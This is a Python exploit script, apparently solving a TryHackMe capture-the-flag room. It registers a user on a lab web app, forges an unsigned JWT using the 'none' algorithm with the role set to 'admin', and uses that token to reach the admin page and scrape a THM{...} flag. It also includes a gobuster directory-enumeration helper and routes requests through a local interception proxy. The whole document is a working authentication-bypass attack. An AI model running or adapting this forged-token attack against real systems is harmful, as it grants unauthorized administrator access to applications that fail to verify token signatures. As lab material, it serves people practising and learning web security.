import subprocess
import requests
import urllib3
import json
import base64
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

url="http://10.49.141.2:5000"
wordList="/usr/share/wordlists/dirb/common.txt"
def goBuster():
    print("working ....")
    cmd=["gobuster","dir","-u",url,"-w",wordList]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        raise RuntimeError(result.stderr)

    output=result.stdout

    return output


def b64url(data):
    json_bytes = json.dumps(data, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(json_bytes).rstrip(b"=").decode()





def main():

    # output=goBuster()
    suspiciouDirectory=""

    # print(output)
    # for line in output.splitlines():
    #     line=line.strip()
    #     if(line.startswith("admin") and ("[-->") in line):
    #         suspiciousDirectory=line.split("[-->")[1].rstrip("]")
    #         print(f"Suspicious DIrectory is : {suspiciousDirectory}")
    #         break
    
    #Creating an account on the site to get the jwt token

    signupPath="/register"
    params={'email':'test@gmail.com',
            'password':'testest'}
    session=requests.session()

    signUp=session.post(url+signupPath,data=params,verify=False,proxies=proxies)

    jwtToken=session.cookies.get("tryheartme_jwt")

    print(f"The JWT Token from the server is : {jwtToken}")

    header = {
    "alg": "none",
    "typ": "JWT"
    }

    payload = {
    "email": "test@gmail.com",
    "role": "admin",
    "credits": 0,
    "iat": 1774263514,
    "theme": "valentine"
    }

    crafted_jwt_token = f"{b64url(header)}.{b64url(payload)}."

    print(f"Crafted JWT token is : {crafted_jwt_token}")

    cookies={
        "tryheartme_jwt":crafted_jwt_token
    }

    adminPageResponse=requests.get(url+"/",cookies=cookies,verify=False,proxies=proxies)

    if "ValenFlag" in adminPageResponse.text:
        flagPath="/receipt/valenflag"
        flag=requests.get(url+flagPath,cookies=cookies,verify=False,proxies=proxies)
        if "THM" in flag.text:

            soup=BeautifulSoup(flag.text,"html.parser")

            flagText=None

            for div in soup.find_all("div"):

                text=div.get_text(strip=True)

                if text.startswith("THM{") and text.endswith("}"):
                    flagText=text
                    break

            print(f"The Final Flag is : {flagText}")
            




    



if __name__=="__main__":
    main()